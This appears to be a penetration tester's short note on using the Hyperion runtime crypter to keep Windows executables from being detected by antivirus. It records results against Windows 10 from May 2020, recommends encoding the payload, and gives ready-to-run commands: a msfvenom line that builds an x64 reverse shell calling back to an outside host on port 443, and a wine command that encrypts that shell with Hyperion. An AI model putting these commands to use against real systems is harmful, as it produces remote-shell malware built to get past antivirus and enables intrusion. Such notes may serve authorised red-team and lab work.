# Antivirus Evasion - Hyperion


https://github.com/nullsecuritynet/tools/tree/master/binary/hyperion/source
https://nullsecurity.net/tools/binary.html

A runtime crypter for 32/64 bit portable executables.
It's a reference implementation and based on the paper "Hyperion: Implementation of a PE-Crypter".

The crypter is a C project.
It encrypts an input executable with AES-128.
The encrypted file decrypts itself on startup (bruteforcing the AES key which may take a few seconds) and generates a log file for debug purpose.

## Observations


### 4th May 2020


As of 4th May 2020, against Windows 10 1809, didn't cause WerFault.exe.

Crypted binary doesn't get detected on disk.
But, depending on payload, will get detected on execution.

Probably best to encode the payload + hyperion, not just a generic msf payload by itself.

## Usage


Generate binary (example)
msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.1.73 LPORT=443 -f exe -o binary.exe

(Parrot OS) Crypt binary with hyperion.exe via wine
sudo wine /usr/share/windows-resources/hyperion/hyperion.exe binary.exe hyperion1.exe
